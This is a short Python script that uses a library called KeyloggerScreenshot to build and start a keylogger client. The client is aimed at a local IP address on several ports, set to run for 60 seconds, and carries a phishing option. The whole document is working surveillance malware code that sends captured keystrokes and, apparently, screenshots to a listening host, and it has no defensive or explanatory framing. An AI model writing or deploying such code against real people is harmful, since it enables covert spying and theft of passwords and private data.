import KeyloggerScreenshot as ks

ip = "192.168.0.70"
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2233, ip, 1133, ip, 4444, duration_in_seconds=60, phishing_web=None)
key_client.start()
